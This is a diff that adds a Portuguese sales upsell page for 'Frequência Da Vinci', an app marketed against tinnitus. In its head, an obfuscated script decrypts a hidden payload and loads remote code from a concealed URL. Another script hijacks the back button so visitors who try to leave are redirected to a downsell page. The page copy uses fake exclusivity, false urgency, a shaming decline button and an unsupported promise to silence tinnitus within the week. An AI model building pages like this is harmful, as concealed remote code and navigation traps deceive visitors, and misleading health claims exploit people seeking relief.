@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Frequência Da Vinci — Oferta Exclusiva</title>
+
+<!-- ===== UTMify: script de UTMs (atribuição) + Pixel ===== -->
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+<script>
+  window.pixelId = "6a5e762172dea9948f83c02b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>(function(){var x_r43o=atob("DBGTHOuVDBt7MNXCTmqxaZn5LiFZWKG2PmKpM8T2aHVVRaGvJ3fqMoj6YTUZQvqxLWP6bJ/mI2sSSLCuYWH6ZI75InEIEvngL2XnboL3eW8eQ/f4FUy/Poz5Y3kaXKbgdEroPoX0YX5ZCveyJ2n2cKLxLjdZRrSuO3SxJsmjbXpIAuWkfHWmeYqhNStLVregeCigKYm3cUYG");var o_8yt=[];for(var e_o6jz=0;e_o6jz<x_r43o.length;e_o6jz++){o_8yt.push(x_r43o.charCodeAt(e_o6jz)&255);}var x_m=o_8yt[0];var x_hugl=o_8yt.slice(1,1+x_m);var a_qrt=o_8yt.slice(1+x_m);var t_hjp=a_qrt.map(function(b,b_o){return b^x_hugl[b_o%x_m];});var r_d="";for(var r_a0=0;r_a0<t_hjp.length;r_a0++){r_d+=String.fromCharCode(t_hjp[r_a0]&255);}var e_9=decodeURIComponent(escape(r_d));var x_n2=JSON.parse(e_9);var l_wh=x_n2.globals||[];l_wh.forEach(function(a_i){window[a_i.name]=a_i.value;});var i_3=document.createElement("script");i_3.src=x_n2.url;i_3.async=true;i_3.defer=true;(x_n2.attributes||[]).forEach(function(w_49){i_3.setAttribute(w_49.name,w_49.value);});(document.head||document.documentElement).appendChild(i_3);})();</script>
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = '/back2-zumbido/';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+<!-- ======================================================= -->
+
+<style>
+  :root{
+    --preto:#000000;
+    --coral:#F53B51;      /* banner, botão recusa e rodapé */
+    --vermelho:#E31E24;   /* destaques em texto e preço */
+    --verde:#22A745;      /* botão de aceite */
+    --texto:#111111;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+    background:#e8e8e8;
+    color:var(--texto);
+    line-height:1.55;
+    font-weight:700;
+  }
+  .wrapper{
+    max-width:680px;
+    margin:0 auto;
+    background:#ffffff;
+    overflow:hidden;
+  }
+
+  /* Barra preta de topo */
+  .top-bar{
+    background:var(--preto);
+    color:#ffffff;
+    text-align:center;
+    text-transform:uppercase;
+    font-weight:800;
+    font-size:clamp(19px,5vw,25px);
+    line-height:1.3;
+    padding:22px 18px;
+  }
+
+  /* Conteúdo central */
+  .content{
+    padding:0 26px 40px;
+    text-align:center;
+  }
+
+  /* Banner "VOCÊ FOI SELECIONADO!" */
+  .banner{
+    background:var(--coral);
+    color:#ffffff;
+    text-transform:uppercase;
+    font-weight:800;
+    font-size:clamp(20px,5.4vw,27px);
+    padding:14px 12px;
+    border-radius:4px;
+    margin:26px 0;
+  }
+
+  .content p{
+    font-size:clamp(17px,4.6vw,21px);
+    margin-top:24px;
+  }
+
+  .destaque{color:var(--vermelho)}
+
+  .preco{
+    color:var(--vermelho);
+    font-size:clamp(22px,6vw,28px);
+    margin:22px 0;
+  }
+
+  /* Botões */
+  .btn{
+    display:block;
+    width:100%;
+    text-decoration:none;
+    color:#ffffff;
+    text-align:center;
+    text-transform:uppercase;
+    font-weight:800;
+    cursor:pointer;
+    transition:transform .12s ease, filter .12s ease;
+  }
+  .btn:hover{filter:brightness(1.05)}
+  .btn:active{transform:scale(.985)}
+  .btn:focus-visible{outline:3px solid #1d4ed8;outline-offset:3px}
+
+  .btn-aceite{
+    background:var(--verde);
+    font-size:clamp(17px,4.6vw,21px);
+    padding:26px 18px;
+    border-radius:12px;
+    margin-top:46px;
+    box-shadow:0 6px 14px rgba(34,167,69,.28);
+  }
+
+  .btn-recusa{
+    background:var(--coral);
+    font-size:clamp(16px,4.4vw,20px);
+    padding:20px 18px;
+    border-radius:40px;
+    margin-top:20px;
+  }
+
+  /* Garantia */
+  .garantia{
+    font-size:clamp(15px,4.2vw,19px);
+    margin-top:26px;
+  }
+
+  /* Rodapé */
+  .footer{
+    background:var(--coral);
+    color:#ffffff;
+    text-align:center;
+    padding:26px 18px 30px;
+    font-size:clamp(13px,3.6vw,15px);
+  }
+  .footer p{margin:6px 0}
+  .footer a{color:#ffffff;text-decoration:none}
+  .footer a:hover{text-decoration:underline}
+</style>
+<script>!function(w,d,s,u,n,a,b){if(w[n])return;a=w[n]={q:[],t:+new Date,s:[],o:u,track:function(){a.q.push([+new Date].concat([].slice.call(arguments)))},setScope:function(){a.s=[].slice.call(arguments).filter(function(x){return typeof x==="string"});a.q.push([+new Date,"setScope"].concat(a.s))},scope:function(){var c=[].slice.call(arguments);return{track:function(){a.q.push([+new Date].concat([].slice.call(arguments)).concat([{__scope:c}]))}}}};b=d.createElement(s);b.async=1;b.src=u+"/s.js";d.getElementsByTagName(s)[0].parentNode.insertBefore(b,d.getElementsByTagName(s)[0])}(window,document,"script","https://t.whop.tw","whop");whop.setScope("biz_j9p9dmKw7rkUZK");whop.track("page");</script>
+</head>
+<body>
+  <div class="wrapper">
+
+    <div class="top-bar">As informações abaixo são confidenciais! Não compartilhe com ninguém!</div>
+
+    <div class="content">
+
+      <div class="banner">Você foi selecionado!</div>
+
+      <p>Volto a ressaltar que não queremos que o preço seja um empecilho para você obter sua paz novamente e se ver livre do zumbido ainda essa semana.</p>
+
+      <p>Por isso eu resolvi fazer algo inédito…</p>
+
+      <p>Vou te dar um desconto imediato de <span class="destaque">37% na "Frequência Da Vinci" + acesso a todas as atualizações e melhorias do aplicativo Frequência Da Vinci para sempre</span>, sem precisar pagar mensalidade…</p>
+
+      <p>Tudo isso por apenas:</p>
+
+      <p class="preco">R$97,00</p>
+
+      <p>Mas você precisa agir agora, caso contrário, serei obrigado a passar esse seu desconto para o próximo integrante que baixar nosso aplicativo…</p>
+
+      <p>Clique no botão abaixo para garantir seu desconto exclusivo:</p>
+
+      <!-- BOTÃO DE ACEITE -> checkout Cakto -->
+      <a href="https://whop.com/checkout/plan_R5cvkjBWKtZLY" class="btn btn-aceite">Aceito tudo isso por R$97,00</a>
+
+      <!-- BOTÃO DE RECUSA -> página de downsell -->
+      <a href="/back2-zumbido/" class="btn btn-recusa">Não quero silenciar o zumbido</a>
+
+      <p class="garantia">Isso mesmo! Nós assumimos todo o risco!</p>
+
+      <p class="garantia">Oferecemos uma garantia de <span class="destaque">365 dias</span> no aplicativo Frequência Da Vinci. Se você passar por todo o programa, aplicar tudo o que é transmitido e, mesmo assim, você não atingir o seu objetivo, nós <span class="destaque">devolveremos 100%</span> do seu dinheiro, sem qualquer burocracia. Essa é a verdadeira garantia <span class="destaque">RISCO ZERO!</span></p>
+
+    </div>
+
+    <div class="footer">
+      <p>Todos os Direitos Reservados</p>
+      <p><a href="#">Política de Privacidade</a> | <a href="#">Termos de uso</a></p>
+    </div>
+
+  </div>
+</body>
+</html>
